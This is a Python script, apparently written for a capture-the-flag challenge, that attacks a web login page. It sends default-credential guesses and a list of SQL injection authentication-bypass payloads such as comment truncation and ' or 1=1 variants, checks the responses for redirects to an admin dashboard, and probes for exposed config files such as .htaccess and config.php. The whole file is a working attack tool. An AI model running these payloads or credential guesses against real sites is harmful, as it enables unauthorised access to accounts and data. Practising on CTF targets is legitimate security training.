#!/usr/bin/env python3
"""
Try simpler SQL injection bypasses and analyze the application behavior
"""

import requests
import re
from urllib.parse import urljoin

def test_simple_bypasses(base_url):
    """Test very simple SQL injection bypasses"""
    login_url = urljoin(base_url, "/login")
    
    # Very simple payloads that might not trigger WAF
    payloads = [
        # Basic authentication bypass
        {"username": "admin", "password": "admin"},
        {"username": "administrator", "password": "administrator"},
        {"username": "root", "password": "root"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "123456"},
        
        # Simple SQL bypasses
        {"username": "admin'#", "password": "anything"},
        {"username": "admin'/*", "password": "anything"},
        {"username": "admin';", "password": "anything"},
        {"username": "admin' ", "password": "anything"},
        
        # Try different positions
        {"username": "anything", "password": "admin'#"},
        {"username": "anything", "password": "admin';"},
        
        # Maybe it's not parameterized at all
        {"username": "' or 1=1 #", "password": "anything"},
        {"username": "' or 1=1 /*", "password": "anything"},
        {"username": "' or 1=1;", "password": "anything"},
        
        # Try without spaces
        {"username": "'or'1'='1", "password": "anything"},
        {"username": "'or'a'='a", "password": "anything"},
        {"username": "'or''='", "password": "anything"},
        
        # Maybe it's using LIKE
        {"username": "admin%", "password": "anything"},
        {"username": "%admin%", "password": "anything"},
        
        # Try empty values
        {"username": "", "password": ""},
        {"username": " ", "password": " "},
    ]
    
    print("Testing simple bypass attempts...")
    
    for i, payload in enumerate(payloads):
        try:
            response = requests.post(login_url, data=payload, timeout=10, allow_redirects=False)
            print(f"Payload {i+1}: {payload}")
            print(f"  Status: {response.status_code}")
            
            if response.status_code == 302:
                location = response.headers.get('Location', 'Unknown')
                print(f"  Redirect to: {location}")
                
                if 'dashboard' in location or 'admin' in location:
                    print("  *** POTENTIAL SUCCESS! ***")
                    # Follow redirect
                    cookies = response.cookies
                    dashboard_response = requests.get(urljoin(base_url, location), cookies=cookies)
                    print(f"  Dashboard response: {dashboard_response.status_code}")
                    print(f"  Content: {dashboard_response.text[:500]}")
                    
                    if "hw{" in dashboard_response.text.lower():
                        print("  *** FLAG FOUND! ***")
                        return dashboard_response.text
            
            elif response.status_code == 200:
                # Check if we got a different response than usual
                if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                    print("  *** POTENTIAL SUCCESS! ***")
                    print(f"  Content: {response.text[:500]}")
                    
                    if "hw{" in response.text.lower():
                        print("  *** FLAG FOUND! ***")
                        return response.text
                elif len(response.text) < 1000:  # Shorter response might indicate success
                    print(f"  Short response ({len(response.text)} chars)")
            
            elif response.status_code not in [403, 500]:
                print(f"  Unusual status code: {response.status_code}")
                print(f"  Content: {response.text[:200]}")
            
            print()
            
        except requests.exceptions.RequestException as e:
            print(f"  Error: {e}")

def check_source_code_hints(base_url):
    """Check for any hints in static files"""
    static_files = [
        "/static/style.min.css",
        "/static/app.min.js",
        "/favicon.ico",
        "/sitemap.xml",
        "/.htaccess",
        "/web.config",
        "/config.php",
        "/config.json",
        "/package.json",
        "/composer.json"
    ]
    
    print("Checking static files for hints...")
    for file_path in static_files:
        url = urljoin(base_url, file_path)
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"[200] {url}")
                content = response.text[:300]
                if "flag" in content.lower() or "hw{" in content.lower():
                    print(f"  *** POTENTIAL FLAG IN STATIC FILE ***")
                    print(f"  Content: {content}")
                elif len(content) > 0:
                    print(f"  Content preview: {content}")
        except requests.exceptions.RequestException:
            continue

def main():
    base_url = "https://admin-panel-ctf.onrender.com"
    
    print("=== Simple Bypass Attempts ===")
    
    # Check static files first
    check_source_code_hints(base_url)
    
    print("\n" + "="*50 + "\n")
    
    # Try simple bypasses
    result = test_simple_bypasses(base_url)
    if result and "hw{" in result.lower():
        print("Flag found!")
        # Extract and display the flag
        flag_match = re.search(r'hw\{[^}]+\}', result, re.IGNORECASE)
        if flag_match:
            print(f"FLAG: {flag_match.group()}")

if __name__ == "__main__":
    main()